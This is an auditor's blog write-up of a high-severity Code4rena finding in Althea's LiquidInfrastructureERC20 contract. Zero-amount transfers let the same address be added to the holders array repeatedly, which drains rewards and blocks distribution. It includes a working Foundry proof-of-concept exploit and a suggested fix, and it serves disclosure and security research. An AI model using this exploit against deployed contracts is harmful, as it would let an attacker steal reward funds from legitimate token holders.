+++
title = "Althea Liquid Infrastructure"
date = "2024-03-11"
description = "Found my first high severity issue in my first Code4rena contest and second contest ever. Unfortunately, my report was misjudged and I didn't receive any payout."

[taxonomies]
tags = ["Audit Report", "achievement", "Code4rena"]

[extra]
achievement_category = "Web3 Achievements"
achievement_anchor = "achievement"
platform = "Code4rena"
audit_link = "https://code4rena.com/audits/2024-02-althea-liquid-infrastructure"
report = "https://code4rena.com/reports/2024-02-althea-liquid-infrastructure"
start = "2024-02-13"
finish = "2024-02-19"
payment = 0
nsloc = 377
protocol_category = "ERC20/ERC721"
findings = "1H"
ranking_position = "misjudged"
participants = 93
ranking_link = "https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/702#issuecomment-2123414418"
home_feed_label = "Audit Contest"
overview = "Liquid Infrastructure is a protocol to enable the tokenization and investment in real world assets which accrue revenue on-chain, and will be deployed on the Althea-L1 blockchain after launch. The protocol consists of tokenized real world assets represented on-chain by deployed LiquidInfrastructureNFT contracts, and the LiquidInfrastructureERC20 token that functions to aggregate and distribute revenue proportionally to holders. LiquidInfrastructureNFTs are flexible enough to represent devices like routers participating in Althea's pay-per-forward billing protocol, vending machines, renewable energy infrastructure, or electric car chargers. Liquid Infrastructure makes it possible to automatically manage these tokenized assets and arbitrarily group them, creating ERC20 tokens that represent real world assets of various classes.<br><br>Althea-L1 is a Cosmos SDK chain with an EVM compatibility layer, and the Liquid Infrastructure contracts make mention of several features that the chain will bring to Liquid Infrastructure."

references = [{name = "Althea Liquid Infrastructure explanation", url = "https://medium.com/althea-mesh/althea-is-launching-liquid-infrastructure-what-it-is-and-why-it-matters-f5b7d1d61b7d"}, {name = "Althea whitepaper", url="https://updates.althea.net/Althea-Whitepaper-v2.0.pdf"}, {name = "Althea L1 site", url="https://www.althea.net/"}, { name = "Contest page on Code4rena", url = "https://code4rena.com/audits/2024-02-althea-liquid-infrastructure"}, { name = "Official Code4rena Report", url = "https://code4rena.com/reports/2024-02-althea-liquid-infrastructure" }, { name = "Judge confirming the validity of my report", url="https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/702#issuecomment-2124668606"}]

findings_data = [
    { id = "H-1", severity = "High", payment = 0, original_report = "https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/702", duplicates = 50 }
]
+++

## Achievement
I found my first high severity issue in my second ever audit contest. Unfortunately, this report was misjudged, and I didn't receive the payout. At least, [the judge recognized his mistake](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/702#issuecomment-2124668606) and retracted it. I couldn't question earlier because I don't have the "backstage role" on Code4rena, which would allow me to track and participate in discussions on the issues before the final report is consolidated.

The [selected report](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/77) by [Mr. Potato Magic](https://code4rena.com/audits/2024-02-althea-liquid-infrastructure#top) received **$391.06** and **ranked 7** in this contest.

# High findings
## [H-1] Flawed existance check of holders in LiquidInfrastructureERC20.sol::_beforeTokenTransfer, result in improper reward distribution and DoS. {#H-1}

### Vulnerability Details
Holders in `LiquidInfrastructureERC20` are accounted in `holders` array and are expected to be unique entries in this array. During the distribution period, each entry in `holders` receives rewards proportionally to the amount of its `LiquidInfrastructureERC20` tokens balance.

New holders (i.e. those with balance becoming greater than 0) are pushed in holders array in [LiquidInfrastructureERC20.sol::_beforeTokenTransfer](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L142-L145) hook:

```javascript
// File: althea-l1-pocs/src/LiquidInfrastructureERC20.sol::_beforeTokenTransfer
142:         bool exists = (this.balanceOf(to) != 0);
143:         if (!exists) {
144: @>           holders.push(to);
145:         }
```

And no-longer holders (i.e. those with balance becoming 0) are removed from the array in [LiquidInfrastructureERC20.sol::_afterTokenTransfer](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L169-L178) hook:

```javascript
// File: althea-l1-pocs/src/LiquidInfrastructureERC20.sol::_afterTokenTransfer
169:         bool stillHolding = (this.balanceOf(from) != 0);
170:         if (!stillHolding) {
171:             for (uint i = 0; i < holders.length; i++) {
172:                 if (holders[i] == from) {
173:                     // Remove the element at i by copying the last one into its place and removing the last element
174:                     holders[i] = holders[holders.length - 1];
175: @>                  holders.pop();
176:                 }
177:             }
178:         }
```

The root cause of the vulnerability is the exitance check for holders in [LiquidInfrastructureERC20.sol#L142](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L142) is flawed. The current token balance of the recipient is being checked to be different than zero. If this condition is satisfied, it is assumed that the recipient doen't exist in `holders` and a new entry is pushed in the array:

```javascript
// File: althea-l1-pocs/src/LiquidInfrastructureERC20.sol::_beforeTokenTransfer
142: @>      bool exists = (this.balanceOf(to) != 0);
143:         if (!exists) {
144:              holders.push(to);
145:         }
```

However, this condition does not prevent the case where the recipient receives transfers of zero amount. Recipients whose initial balance is zero and receives zero amount transfers are pushed into `holders` and their balance remains zero after the transfer. A new transfer to this recipient will bypass the existance check for holders resulting in the same recipient to be pushed again in `holders`.

Reward distribution iterates over `holders` and transfers reward tokens for each entry in this array proportionally to its balance, as pointed out in code snippet of [LiquidInfrastructureERC20.sol#L208-L232](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L208-L232) bellow:

```javascript
// File: althea-l1-pocs/src/LiquidInfrastructureERC20.sol::distribute
208: @>      uint256 limit = Math.min(
209:             nextDistributionRecipient + numDistributions,
210: @>          holders.length
211:         );
212: 
213:         uint i;
214: @>      for (i = nextDistributionRecipient; i < limit; i++) {
215: @>          address recipient = holders[i];
216:             if (isApprovedHolder(recipient)) {
217:                 uint256[] memory receipts = new uint256[](
218:                     distributableERC20s.length
219:                 );
220:                 for (uint j = 0; j < distributableERC20s.length; j++) {
221:                     IERC20 toDistribute = IERC20(distributableERC20s[j]);
222:                     uint256 entitlement = erc20EntitlementPerUnit[j] *
223: @>                      this.balanceOf(recipient);
224: @>                  if (toDistribute.transfer(recipient, entitlement)) {
225:                         receipts[j] = entitlement;
226:                     }
227:                 }
228: 
229:                 emit Distribution(recipient, distributableERC20s, receipts);
230:             }
231:         }
232:         nextDistributionRecipient = i;
```
A malicious actor can inject the same recipient multiple times into holders in order to receive reward multiple times and to prevent subsequent real holders to receive rewards due to premature depletion of reward funds, leading to a DoS of the contract.

### Impact
1. Latest holders won't receive rewards because a malicious holders would get more rewards than expected, making `LiquidInfrastructureERC20` run out of reward funds before reaching the end of `holders` array;
2. Since the contract runned out of reward funds while locked for distribution and not all holders have been payed, the distribution period will never finish, preventing functions protected by `LockedForDistribution` varible to execute, leading to a DoS.

### Proof of Concept
```javascript
001: //SPDX-License-Identifier: Apache-2.0
002: pragma solidity 0.8.12;
003: 
004: import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
005: import "../src/LiquidInfrastructureNFT.sol";
006: import "../src/LiquidInfrastructureERC20.sol";
007: import "forge-std/Test.sol";
008: 
009: contract DT is ERC20 {
010:     address private owner;
011: 
012:     constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {
013:         owner = msg.sender;
014:     }
015: 
016:     function mint(address to, uint256 amount) public {
017:         require(msg.sender == owner, "not allowed");
018:         _mint(to, amount);
019:     }
020: }
021: 
022: contract LiquidInfrastructureERC20Test is Test {
023:     address owner = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496;
024:     address alice = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
025:     address bob   = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
026:     address eve  = 0x1Df3d35F66b4C30686a1604E3af08779A3914b51;
027:     uint256 MIN_DISTRIBUTION_PERIOD = 2;
028: 
029:     function test_DoS_distribute_rewards() public {
030:         uint256 injectedHolders = 100;
031:         uint256 initialTokensAmount = 1e18;
032:         uint256 smallAmountEnoughToDrainRewards = 1e17;
033:         uint256 totalRewardsAmount = 10e18;
034:         uint256 nextDistributionBlock = block.number + MIN_DISTRIBUTION_PERIOD;
035: 
036:         ////// Begin Setup ////////////////////////////////////////////
037:         address[] memory distributable_tokens = new address[](1);
038:         address[] memory managed_nfts = new address[](1);
039:         address[] memory approved_holders = new address[](3);
040: 
041:         DT rewardTokens = new DT("distributable token", "DT");
042:         distributable_tokens[0] = address(rewardTokens);
043: 
044:         LiquidInfrastructureNFT nft = new LiquidInfrastructureNFT("A");
045:         managed_nfts[0] = address(nft);
046: 
047:         approved_holders[0] = alice;
048:         approved_holders[1] = bob;
049:         approved_holders[2] = eve;
050: 
051:         LiquidInfrastructureERC20 erc20 = new LiquidInfrastructureERC20(
052:             "liquid infrastructure token",
053:             "LIT",
054:             managed_nfts, 
055:             approved_holders, 
056:             MIN_DISTRIBUTION_PERIOD,
057:             distributable_tokens
058:         );
059:         erc20.mint(bob, initialTokensAmount);
060:         rewardTokens.mint(address(erc20), totalRewardsAmount);
061:         ////// End Setup //////////////////////////////////////////////
062: 
063:         // Bob, a malicious holder, transfers zero amount
064:         // to another approved EOA (e.g. Eve) mutiple times.
065:         // As a result, this account will be repeatedly
066:         // pushed into `holders` array, bypassing the
067:         // holder "existance" check on LiquidInfrastructureERC20:L143.
068:         vm.startPrank(bob);
069:         for (uint256 i; i < injectedHolders; i++) {
070:             erc20.transfer(eve, 0);
071:         }
072: 
073:         // Now, let's imagine that Alice wants to buy Bob's tokens.
074:         // Bob sends his tokens to Alice and then he sends a small amount
075:         // to Eve, the account he just injected into `holders`, in order to
076:         // Eve's token balance become greater than zero.
077:         erc20.transfer(alice, erc20.balanceOf(bob) - smallAmountEnoughToDrainRewards);
078:         erc20.transfer(eve, smallAmountEnoughToDrainRewards);
079:         vm.stopPrank();
080: 
081:         // Asserting injected empty transferes to eve + last transfer to eve + transfer to alice
082:         address[] memory holders = erc20.getHolders();
083:         assertEq(holders.length, injectedHolders + 2); 
084:         for (uint256 i; i < injectedHolders + 1; i++) {
085:             assertEq(holders[i], eve);
086:         }
087:         assertEq(holders[injectedHolders + 1], alice);
088: 
089:         /** 
090:          * Only the first addresses in `holders` array will receive reward tokens.
091:          * The latest addresses in this array won't receive rewards because the reward token
092:          * balance of LiquidInfrastructureERC20 will be drained before reaching the end
093:          * of the array, since the same holder address is unexpectedly rewarded more than
094:          * once. As a result, the distribution period will never end, leading to a DoS.
095:          *
096:          * In this example, Eve is the only holder of the first portion of the array.
097:          * Therefore all the reward funds will be send to her.
098:          *
099:          * The code in the next 3 lines is calculating the "rewardable" portion of holders
100:          * array, before the balance is completly drained.
101:          */
102:         uint256 entitlementPerUnit = rewardTokens.balanceOf(address(erc20)) / erc20.totalSupply();
103:         uint256 entitlement = entitlementPerUnit * erc20.balanceOf(eve);
104:         uint256 numDistributionsToDrain = totalRewardsAmount / entitlement;
105: 
106:         // Eve has 0 reward tokens before distribution
107:         assertEq(rewardTokens.balanceOf(eve), 0); 
108:         assertEq(rewardTokens.balanceOf(address(erc20)), totalRewardsAmount);
109: 
110:         // Eve, can calculate the numDistributionsToDrain and start the distribution:
111:         vm.roll(nextDistributionBlock);
112:         erc20.distribute(numDistributionsToDrain);
113: 
114:         // Eve has drained all the reward tokens.
115:         assertEq(rewardTokens.balanceOf(eve), totalRewardsAmount); 
116:         assertEq(rewardTokens.balanceOf(address(erc20)), 0);
117: 
118:         // Distribution period will never end because latest holders won't be able to receive
119:         // rewards, since the balance of LiquidInfrastructureERC20 has been prematurely drained.
120:         vm.expectRevert("ERC20: transfer amount exceeds balance");
121:         erc20.distributeToAllHolders();
122: 
123:         // Alice, a latest holder, won't be able to transfer her LiquidInfrastructureERC20
124:         // tokens neither receive rewards (or anything else) because end of distribution period
125:         // will never be met.
126:         vm.expectRevert("distribution in progress");
127:         vm.prank(alice);
128:         erc20.transfer(bob, 1);
129:     }
```

### Tool used
Foundry

### Recommendation
```diff
// File: althea-l1-pocs/src/LiquidInfrastructureERC20.sol
127:     function _beforeTokenTransfer(
128:         address from,
129:         address to,
130:         uint256 amount
131:     ) internal virtual override {
132:         require(!LockedForDistribution, "distribution in progress");
+133:        require(amount > 0, "transfer amount has to be greater than 0");
134:         if (!(to == address(0))) {
...
```

## Assessed type
DoS
